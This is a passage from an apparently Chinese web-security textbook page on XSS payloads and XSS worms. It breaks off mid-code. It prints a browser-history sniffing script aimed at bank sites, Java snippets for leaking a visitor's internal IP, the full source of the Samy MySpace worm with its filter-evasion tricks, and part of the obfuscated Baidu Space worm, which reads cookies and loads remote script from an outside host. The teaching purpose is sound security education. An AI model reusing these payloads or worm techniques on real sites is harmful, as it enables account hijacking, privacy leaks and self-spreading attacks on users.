class="line">SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS</div><div class="line">INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN</div><div class="line">CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)</div><div class="line">ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF</div><div class="line">THE POSSIBILITY OF SUCH DAMAGE.</div><div class="line">*/</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* A short list of websites to loop through checking to see if the victim has been there.</span></div><div class="line">Without noticable performance overhead, testing couple of a couple thousand URL's is</div><div class="line">possible within a few seconds. */</div><div class="line"><span class="keyword">var</span> websites = [</div><div class="line"> <span class="string">"http://ha.ckers.org/blog/"</span>,</div><div class="line"> <span class="string">"http://login.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://mail.google.com/"</span>,</div><div class="line"> <span class="string">"http://mail.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://my.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://sla.ckers.org/forum/"</span>,</div><div class="line"> <span class="string">"http://slashdot.org/"</span>,</div><div class="line"> <span class="string">"http://www.amazon.com/"</span>,</div><div class="line"> <span class="string">"http://www.aol.com/"</span>,</div><div class="line"> <span class="string">"http://www.apple.com/"</span>,</div><div class="line"> <span class="string">"http://www.bankofamerica.com/"</span>,</div><div class="line"> <span class="string">"http://www.bankone.com/"</span>,</div><div class="line"> <span class="string">"http://www.blackhat.com/"</span>,</div><div class="line"> <span class="string">"http://www.blogger.com/"</span>,</div><div class="line"> <span class="string">"http://www.bofa.com/"</span>,</div><div class="line"> <span class="string">"http://www.capitalone.com/"</span>,</div><div class="line"> <span class="string">"http://www.cgisecurity.com/"</span>,</div><div class="line"> <span class="string">"http://www.chase.com/"</span>,</div><div class="line"> <span class="string">"http://www.citibank.com/"</span>,</div><div class="line"> <span class="string">"http://www.cnn.com/"</span>,</div><div class="line"> <span class="string">"http://www.comerica.com/"</span>,</div><div class="line"> <span class="string">"http://www.e-gold.com/"</span>,</div><div class="line"> <span class="string">"http://www.ebay.com/"</span>,</div><div class="line"> <span class="string">"http://www.etrade.com/"</span>,</div><div class="line"> <span class="string">"http://www.flickr.com/"</span>,</div><div class="line"> <span class="string">"http://www.google.com/"</span>,</div><div class="line"> <span class="string">"http://www.hsbc.com/"</span>,</div><div class="line"> <span class="string">"http://www.icq.com/"</span>,</div><div class="line"> <span class="string">"http://www.live.com/"</span>,</div><div class="line"> <span class="string">"http://www.microsoft.com/"</span>,</div><div class="line"> <span class="string">"http://www.microsoft.com/en/us/default.aspx"</span>,</div><div class="line"> <span class="string">"http://www.msn.com/"</span>,</div><div class="line"> <span class="string">"http://www.myspace.com/"</span>,</div><div class="line"> <span class="string">"http://www.passport.net/"</span>,</div><div class="line"> <span class="string">"http://www.paypal.com/"</span>,</div><div class="line"> <span class="string">"http://www.rsaconference.com/2007/US/"</span>,</div><div class="line"> <span class="string">"http://www.salesforce.com/"</span>,</div><div class="line"> <span class="string">"http://www.sourceforge.net/"</span>,</div><div class="line"> <span class="string">"http://www.statefarm.com/"</span>,</div><div class="line"> <span class="string">"http://www.usbank.com/"</span>,</div><div class="line"> <span class="string">"http://www.wachovia.com/"</span>,</div><div class="line"> <span class="string">"http://www.wamu.com/"</span>,</div><div class="line"> <span class="string">"http://www.wellsfargo.com/"</span>,</div><div class="line"> <span class="string">"http://www.whitehatsec.com/home/index.html"</span>,</div><div class="line"> <span class="string">"http://www.wikipedia.org/"</span>,</div><div class="line"> <span class="string">"http://www.xanga.com/"</span>,</div><div class="line"> <span class="string">"http://www.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://www2.blogger.com/home"</span>,</div><div class="line"> <span class="string">"https://banking.wellsfargo.com/"</span>,</div><div class="line"> <span class="string">"https://commerce.blackhat.com/"</span>,</div><div class="line"></div><div class="line"></div><div class="line">];</div><div class="line"></div><div class="line"><span class="comment">/* Loop through each URL */</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; websites.length; i++) &#123;</div><div class="line"></div><div class="line"> <span class="comment">/* create the new anchor tag with the appropriate URL information */</span></div><div class="line"> <span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>);</div><div class="line"> link.id = <span class="string">"id"</span> + i;</div><div class="line"> link.href = websites[i];</div><div class="line"> link.innerHTML = websites[i];</div><div class="line"></div><div class="line"> <span class="comment">/* create a custom style tag for the specific link. Set the CSS visited selector to a</span></div><div class="line">known value, in this case red */</div><div class="line"> <span class="built_in">document</span>.write(<span class="string">'&lt;style&gt;'</span>);</div><div class="line"> <span class="built_in">document</span>.write(<span class="string">'#id'</span> + i + <span class="string">":visited &#123;color: #FF0000;&#125;"</span>);</div><div class="line"> <span class="built_in">document</span>.write(<span class="string">'&lt;/style&gt;'</span>);</div><div class="line"></div><div class="line"> <span class="comment">/* quickly add and remove the link from the DOM with enough time to save the visible</span></div><div class="line">computed color. */</div><div class="line"> <span class="built_in">document</span>.body.appendChild(link);</div><div class="line"> <span class="keyword">var</span> color =</div><div class="line"><span class="built_in">document</span>.defaultView.getComputedStyle(link,<span class="literal">null</span>).getPropertyValue(<span class="string">"color"</span>);</div><div class="line"> <span class="built_in">document</span>.body.removeChild(link);</div><div class="line"></div><div class="line"> <span class="comment">/* check to see if the link has been visited if the computed color is red */</span></div><div class="line"> <span class="keyword">if</span> (color == <span class="string">"rgb(255, 0, 0)"</span>) &#123; <span class="comment">// visited</span></div><div class="line"></div><div class="line"> <span class="comment">/* add the link to the visited list */</span></div><div class="line"> <span class="keyword">var</span> item = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</div><div class="line"> item.appendChild(link);</div><div class="line"> <span class="built_in">document</span>.getElementById(<span class="string">'visited'</span>).appendChild(item);</div><div class="line"></div><div class="line"> &#125; <span class="keyword">else</span> &#123; <span class="comment">// not visited</span></div><div class="line"></div><div class="line"> <span class="comment">/* add the link to the not visited list */</span></div><div class="line"> <span class="keyword">var</span> item = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</div><div class="line"> item.appendChild(link);</div><div class="line"> <span class="built_in">document</span>.getElementById(<span class="string">'notvisited'</span>).appendChild(item);</div><div class="line"></div><div class="line"> &#125; <span class="comment">// end visited color check if</span></div><div class="line"></div><div class="line">&#125; <span class="comment">// end URL loop</span></div><div class="line"><span class="comment">// --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>但是Firefox在2010年3月底决定修补这个问题，因此，未来这种信息泄露的问题可能在Mozilla浏览器中不会再继续存在了。</p>
<p>获取用户的真实IP地址<br>通过XSS Payload还有办法获取一些客户端的本地IP地址。<br>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢？<br>JavaScript本身并没有提供获取本地IP地址的能力，有没有其他办法？一般来说，XSS攻击需要借助第三方软件来完成。比如，客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。<br>在XSS攻击框架“Attack API”中，就有一个获取本地IP地址的API：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">* <span class="doctag">@cat</span> DOM</div><div class="line">* <span class="doctag">@name</span> AttackAPI.dom.getInternalIP</div><div class="line">* <span class="doctag">@desc</span> get internal IP address</div><div class="line">* <span class="doctag">@return</span> &#123;String&#125; IP address</div><div class="line">   */</div><div class="line">  AttackAPI.dom.getInternalIP = function () &#123;</div><div class="line">       <span class="keyword">try</span> &#123;</div><div class="line">               var sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line"></div><div class="line">               sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">               sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(document.domain,</div><div class="line">  (!document.location.port)?<span class="number">80</span>:document.location.port));</div><div class="line"></div><div class="line">               <span class="keyword">return</span> sock.getLocalAddress().getHostAddress();</div><div class="line">       &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line"></div><div class="line">       <span class="keyword">return</span> <span class="string">'127.0.0.1'</span>;</div><div class="line">  &#125;;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">  <span class="comment">//此外，还有两个利用Java获取本地网络信息的API：</span></div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">    * <span class="doctag">@cat</span> DOM</div><div class="line">    * <span class="doctag">@name</span> AttackAPI.dom.getInternalHostname</div><div class="line">    * <span class="doctag">@desc</span> get internal hostname</div><div class="line">    * <span class="doctag">@return</span> &#123;String&#125; hostname</div><div class="line">   */</div><div class="line"></div><div class="line">  AttackAPI.dom.getInternalHostname = function () &#123;</div><div class="line">       <span class="keyword">try</span> &#123;</div><div class="line">               var sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line"></div><div class="line">               sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">               sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(document.domain,</div><div class="line">  (!document.location.port)?<span class="number">80</span>:document.location.port));</div><div class="line"></div><div class="line">               <span class="keyword">return</span> sock.getLocalAddress().getHostName();</div><div class="line">       &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line">       <span class="keyword">return</span> <span class="string">'localhost'</span>;</div><div class="line">  &#125;;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">  * <span class="doctag">@cat</span> DOM</div><div class="line">  * <span class="doctag">@name</span> AttackAPI.dom.getInternalNetworkInfo</div><div class="line">  * <span class="doctag">@desc</span> get the internal network information</div><div class="line">  * <span class="doctag">@return</span> &#123;Object&#125; network information object</div><div class="line">  */</div><div class="line"></div><div class="line">  AttackAPI.dom.getInternalNetworkInfo = function () &#123;</div><div class="line">       var info = &#123;hostname: <span class="string">'localhost'</span>, IP: <span class="string">'127.0.0.1'</span>&#125;;</div><div class="line"></div><div class="line">       <span class="keyword">try</span> &#123;</div><div class="line">               var sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line"></div><div class="line">               sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">               sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(document.domain,</div><div class="line">  (!document.location.port)?<span class="number">80</span>:document.location.port));</div><div class="line"></div><div class="line">               info.IP = sock.getLocalAddress().getHostAddress();</div><div class="line">               info.hostname = sock.getLocalAddress().getHostName();</div><div class="line">       &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line"></div><div class="line">       <span class="keyword">return</span> info;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure>
<p>  这种方法需要攻击者写一个Java Class，嵌入到当前页面中。除了Java之外，一些ActiveX控件可能也会提供接口查询本地IP地址。这些功能比较特殊，需要根据具体情况具体分析，这里不赘述了。</p>
<p>  Metasploit引擎曾展示过一个强大的测试页面，综合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件的功能，抓取用户的本地信息，有兴趣深入研究的读者可以参考。</p>
<p><hr></p>
<h3 id="3-2-3-XSS-攻击平台"><a href="#3-2-3-XSS-攻击平台" class="headerlink" title="3.2.3 XSS 攻击平台"></a>3.2.3 XSS 攻击平台</h3><p>XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台的主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面就介绍几个常见的XSS攻击平台。</p>
<h3 id="Attack-API"><a href="#Attack-API" class="headerlink" title="Attack API"></a>Attack API</h3><p>Attack API是安全研究者pdp所主导的一个项目，它总结了很多能够直接使用XSS Payload，归纳为API的方式。比如上节提到的“获取客户端本地信息的API”就出自这个项目。<br>BeEF<br>BeEF曾经是最好的XSS演示平台。不同于Attack API，BeEF所演示的是一个完整的XSS攻击过程。BeEF有一个控制后台，攻击者可以在后台控制前端的一切。</p>
<p>每个被XSS攻击的用户都将出现在后台，后台控制者可以控制这些浏览器的行为，并可以通过XSS向这些用户发送命令。</p>
<h3 id="XSS-Proxy"><a href="#XSS-Proxy" class="headerlink" title="XSS-Proxy"></a>XSS-Proxy</h3><p>XSS-Proxy是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器。<br>XSS-Proxy的实现原理<br>这些XSS攻击平台有助于深入理解XSS的原理和危害。</p>
<h3 id="3-2-4-终极武器：XSS-Worm"><a href="#3-2-4-终极武器：XSS-Worm" class="headerlink" title="3.2.4 终极武器：XSS Worm"></a>3.2.4 终极武器：XSS Worm</h3><p>终极武器：XSS Worm</p>
<p>XSS也能形成蠕虫吗？我们知道，以往的蠕虫是利用服务器端软件漏洞进行传播的。比如2003年的冲击波蠕虫，利用的是Windows的RPC远程溢出漏洞。</p>
<p>Samy Worm</p>
<p>在2005年，年仅19岁的Samy Kamkar发起了对MySpace.com的XSS Worm攻击。Samy Kamkar的蠕虫在短短几小时内就感染了100万用户——它在每个用户的自我简介后边加了一句话：“but most of all, Samy is my hero.”（Samy是我的偶像）。这是Web安全史上第一个重量级的XSS Worm，具有里程碑意义。</p>
<p>今天我们看看当时的Samy蠕虫都做了些什么？</p>
<p>首先，MySpace过滤了很多危险的HTML标签，只保留了<code>&lt;a&gt;标签</code>、<code>&lt;img&gt;标签</code>、<code>&lt;div&gt;标签</code>等“安全的标签”。所有的事件比如“onclick”等也被过滤了。但是MySpace却允许用户控制标签的style属性，通过style，还是有办法构造出XSS的。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div style=&quot;background:url(&apos;javascript:alert(1)&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<p>其次，MySpace同时还过滤了<code>javascript</code>、<code>onreadystatechange</code>等敏感词，所以Samy用了“拆分法”绕过这些限制。<br>最后，Samy通过AJAX构造的POST请求，完成了在用户的heros列表里添加自己名字的功能；同时复制蠕虫自身进行传播。至此，XSS Worm就完成了。有兴趣的读者可以参考Samy蠕虫的技术细节分析。</p>
<p>下面附上Samy Worm的源代码。这是具有里程碑意义的第一个XSS Worm，原本的代码压缩在一行内。为了方便阅读，如下代码已经经过了整理和美化。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">mycode</span> <span class="attr">style</span>=<span class="string">"BACKGROUND: url('javascript:eval(document.all.mycode.expr)')"</span></span></div><div class="line">    <span class="attr">expr</span>=<span class="string">"var B=String.fromCharCode(34);</span></div><div class="line">    var A=String.fromCharCode(39);</div><div class="line">    function g()&#123;</div><div class="line">      var C;</div><div class="line">      try&#123;</div><div class="line">        var D=document.body.createTextRange();</div><div class="line">        C=D.htmlText</div><div class="line">      &#125;catch(e)&#123;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      if(C)&#123;</div><div class="line">        return C</div><div class="line">      &#125;else&#123;</div><div class="line">      return eval('document.body.inne'+'rHTML')</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function getData(AU)&#123;</div><div class="line">      M=getFromURL(AU,'friendID');</div><div class="line">      L=getFromURL(AU,'Mytoken')</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function getQueryParams()&#123;</div><div class="line">      var E=document.location.search;</div><div class="line">      var F=E.substring(1,E.length).split('&amp;');</div><div class="line">      var AS=new Array();</div><div class="line"></div><div class="line">      for(var O=0;O&lt;F.length;O++)&#123;</div><div class="line">        var I=F[O].split('=');</div><div class="line">        AS[I[0]]=I[1]&#125;return AS</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var J;</div><div class="line">      var AS=getQueryParams();</div><div class="line">      var L=AS['Mytoken'];</div><div class="line">      var M=AS['friendID'];</div><div class="line"></div><div class="line">      if(location.hostname=='profile.myspace.com')&#123;</div><div class="line">        document.location='http://www.myspace.com'+location.pathname+location.search</div><div class="line">      &#125;else&#123;</div><div class="line">        if(!M)&#123;</div><div class="line">          getData(g())</div><div class="line">        &#125;</div><div class="line">        main()</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getClientFID()&#123;</div><div class="line">        return findIn(g(),'up_launchIC( '+A,A)</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function nothing()&#123;&#125;</div><div class="line"></div><div class="line">      function paramsToString(AV)&#123;</div><div class="line">        var N=new String();</div><div class="line">        var O=0;</div><div class="line">        for(var P in AV)&#123;</div><div class="line">          if(O&gt;0)&#123;</div><div class="line">            N+='&amp;'</div><div class="line">          &#125;</div><div class="line">          var Q=escape(AV[P]);</div><div class="line"></div><div class="line">          while(Q.indexOf('+')!=-1)&#123;</div><div class="line">            Q=Q.replace('+','%2B')</div><div class="line">          &#125;</div><div class="line"></div><div class="line">          while(Q.indexOf('&amp;')!=-1)&#123;</div><div class="line">            Q=Q.replace('&amp;','%26')</div><div class="line">          &#125;</div><div class="line"></div><div class="line">          N+=P+'='+Q;</div><div class="line">          O++</div><div class="line">        &#125;</div><div class="line">        return N</div><div class="line">      &#125;</div><div class="line">      function httpSend(BH,BI,BJ,BK)&#123;</div><div class="line">        if(!J)&#123;</div><div class="line">          return false</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        eval('J.onr'+'eadystatechange=BI');</div><div class="line"></div><div class="line">        J.open(BJ,BH,true);</div><div class="line"></div><div class="line">        if(BJ=='POST')&#123;</div><div class="line">          J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</div><div class="line">          J.setRequestHeader('Content-Length',BK.length)</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        J.send(BK);</div><div class="line"></div><div class="line">        return true</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function findIn(BF,BB,BC)&#123;</div><div class="line">        var R=BF.indexOf(BB)+BB.length;</div><div class="line">        var S=BF.substring(R,R+1024);</div><div class="line">        return S.substring(0,S.indexOf(BC))</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getHiddenParameter(BF,BG)&#123;</div><div class="line">        return findIn(BF,'name='+B+BG+B+' value='+B,B)</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getFromURL(BF,BG)&#123;</div><div class="line">        var T;</div><div class="line">        if(BG=='Mytoken')&#123;</div><div class="line">          T=B</div><div class="line">        &#125;else&#123;</div><div class="line">          T='&amp;'</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var U=BG+'=';</div><div class="line">        var V=BF.indexOf(U)+U.length;</div><div class="line">        var W=BF.substring(V,V+1024);</div><div class="line">        var X=W.indexOf(T);</div><div class="line">        var Y=W.substring(0,X);</div><div class="line">        return Y</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getXMLObj()&#123;</div><div class="line">        var Z=false;</div><div class="line">        if(window.XMLHttpRequest)&#123;</div><div class="line">          try&#123;</div><div class="line">            Z=new XMLHttpRequest()</div><div class="line">          &#125;catch(e)&#123;</div><div class="line">            Z=false</div><div class="line">          &#125;</div><div class="line">        &#125;else if(window.ActiveXObject)&#123;</div><div class="line">          try&#123;</div><div class="line">            Z=new ActiveXObject('Msxml2.XMLHTTP')</div><div class="line">          &#125;catch(e)&#123;</div><div class="line">            try&#123;</div><div class="line">              Z=new ActiveXObject('Microsoft.XMLHTTP')</div><div class="line">            &#125;catch(e)&#123;</div><div class="line">              Z=false</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">        return Z</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var AA=g();</div><div class="line">      var AB=AA.indexOf('m'+'ycode');</div><div class="line">      var AC=AA.substring(AB,AB+4096);</div><div class="line">      var AD=AC.indexOf('D'+'IV');</div><div class="line">      var AE=AC.substring(0,AD);</div><div class="line">      var AF;</div><div class="line"></div><div class="line">      if(AE)&#123;</div><div class="line">        AE=AE.replace('jav'+'a',A+'jav'+'a');</div><div class="line">        AE=AE.replace('exp'+'r)','exp'+'r)'+A);</div><div class="line">        AF=' but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var AG;</div><div class="line"></div><div class="line">      function getHome()&#123;</div><div class="line">        if(J.readyState!=4)&#123;</div><div class="line">          return</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var AU=J.responseText;</div><div class="line">        AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');</div><div class="line">        AG=AG.substring(61,AG.length);</div><div class="line"></div><div class="line">        if(AG.indexOf('samy')==-1)&#123;</div><div class="line">          if(AF)&#123;</div><div class="line">            AG+=AF;</div><div class="line">            var AR=getFromURL(AU,'Mytoken');</div><div class="line">            var AS=new Array();</div><div class="line">            AS['interestLabel']='heroes';</div><div class="line">            AS['submit']='Preview';</div><div class="line">            AS['interest']=AG;</div><div class="line">            J=getXMLObj();</div><div class="line">            httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,</div><div class="line">'POST',paramsToString(AS))</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function postHero()&#123;</div><div class="line">        if(J.readyState!=4)&#123;</div><div class="line">          return</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var AU=J.responseText;</div><div class="line">        var AR=getFromURL(AU,'Mytoken');</div><div class="line">        var AS=new Array();</div><div class="line">        AS['interestLabel']='heroes';</div><div class="line">        AS['submit']='Submit';</div><div class="line">        AS['interest']=AG;</div><div class="line">        AS['hash']=getHiddenParameter(AU,'hash');</div><div class="line">        httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,</div><div class="line">'POST',paramsToString(AS))</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function main()&#123;</div><div class="line">        var AN=getClientFID();</div><div class="line">        var BH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;</div><div class="line">        J=getXMLObj();</div><div class="line">        httpSend(BH,getHome,'GET');</div><div class="line">        xmlhttp2=getXMLObj();</div><div class="line">        httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;</div><div class="line">Mytoken=' +L,processxForm,'GET')</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function processxForm()&#123;</div><div class="line">        if(xmlhttp2.readyState!=4)&#123;</div><div class="line">        return</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var AU=xmlhttp2.responseText;</div><div class="line">      var AQ=getHiddenParameter(AU,'hashcode');</div><div class="line">      var AR=getFromURL(AU,'Mytoken');</div><div class="line">      var AS=new Array();</div><div class="line">      AS['hashcode']=AQ;</div><div class="line">      AS['friendID']='11851658';</div><div class="line">      AS['submit']='Add to Friends';</div><div class="line">      httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,</div><div class="line">'POST',paramsToString(AS))</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function httpSend2(BH,BI,BJ,BK)&#123;</div><div class="line">      if(!xmlhttp2)&#123;</div><div class="line">        return false</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      eval('xmlhttp2.onr'+'eadystatechange=BI');</div><div class="line">      xmlhttp2.open(BJ,BH,true);</div><div class="line"></div><div class="line">      if(BJ=='POST')&#123;</div><div class="line">        xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</div><div class="line">        xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;</div><div class="line">        xmlhttp2.send(BK);</div><div class="line">        return true</div><div class="line">      &#125;"&gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">DIV</span>&gt;</span></div></pre></td></tr></table></figure>
<p>XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的。但是发起XSS Worm攻击也有一定的条件。</p>
<p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。</p>
<p>发送站内信、用户留言等页面，都是XSS Worm的高发区，需要重点关注。而相对的，如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p>
<p>下面这个XSS Worm的案例来自百度。</p>
<p>2007年12月，百度空间的用户忽然互相之间开始转发垃圾短消息，后来百度工程师紧急修复了这一漏洞：</p>
<p>百度空间的XSS蠕虫公告</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">这次事件，是由XSS Worm造成的。时任百度系统部高级安全顾问的方小顿，分析了这个蠕虫的技术细节，他在文中写到：</div><div class="line">上面基本就是代码，总体来说，还是很有意思的。</div><div class="line">首先就是漏洞，过滤多一个字符都不行，甚至挪一个位置都不行（上面的Playload部分）。这个虫子比较特殊的地方是感染IE用户，对其他用户无影响；另外就是完全可以隐蔽地传播，因为只是在CSS中加代码并不会有什么明显的地方，唯一的缺陷是有点卡。所以，完全可以长时间地存在，感染面不限制于blog，存在CSS的地方都可以，譬如Profile。</div><div class="line">另外比较强大的一点就是跟真正的虫子一样，不只是被动地等待，选择在好友发消息时引诱别人过来访问自己的blog，利用好奇心可以做到这点。</div><div class="line">最后还加了个给在线人随机发消息请求加链接，威力可能更大，因为会创造比较大的基数，这样一感染就是一个blog。</div><div class="line">到Baidu封锁时，这个虫子已经感染了8700多个blog。总体来说还不错，本来想作为元旦的一个贺礼，不过还是提前死掉了。可以看到，在代码和流程里运用了很多系统本身就有的特性，自己挖掘吧。</div></pre></td></tr></table></figure>
<p>这个百度XSS Worm的源代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">window.onerror = killErrors;</div><div class="line">execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D</div><div class="line">%20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20</div><div class="line">%20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Ab</div><div class="line">s%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20s</div><div class="line">trReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20</div><div class="line">%20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20</div><div class="line">%20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20</div><div class="line">%20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20</div><div class="line">%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%2</div><div class="line">0%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20</div><div class="line">innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strR</div><div class="line">eturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Lo</div><div class="line">w8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding</div><div class="line">%20%3D%20strReturn%0AEnd%20Function'),'VBScript');</div><div class="line">cookie='';</div><div class="line">cookieval=document.cookie;</div><div class="line">spaceid=spaceurl;</div><div class="line">myhibaidu="http://hi.baidu.com"+spaceid;</div><div class="line">xmlhttp=poster();</div><div class="line">debug=0;</div><div class="line"></div><div class="line">online();</div><div class="line"></div><div class="line">if(spaceid!='/') &#123;</div><div class="line">  if(debug==1) &#123;</div><div class="line">    goteditcss();</div><div class="line">    document.cookie='xssshell/owned/you!';</div><div class="line">  &#125;</div><div class="line">  if(cookieval.indexOf('xssshell')==-1) &#123;</div><div class="line">    goteditcss();</div><div class="line">    document.cookie='xssshell/owned/you!';</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function makeevilcss(spaceid,editurl,use)&#123;</div><div class="line">  playload="a&#123;evilmask:ex/*exp/**/ression*/pression(execScript(unescape('d%253D%2522doc</div><div class="line">  %2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bva</div><div class="line">  r%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%2</div><div class="line">  53D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd</div><div class="line">  %252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x%</div><div class="line">  2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528%</div><div class="line">  2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%2</div><div class="line">  53Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))&#125;";</div><div class="line">  action=myhibaidu+"/commit";</div><div class="line">  spCssUse=use;</div><div class="line">  s=getmydata(editurl);</div><div class="line"></div><div class="line">  re = /\&lt;input type=\"hidden\" id=\"ct\" name=\"ct\" value=\"(.*?)\"/i;</div><div class="line">  ct = s.match(re);</div><div class="line">  ct=(ct[1]);</div><div 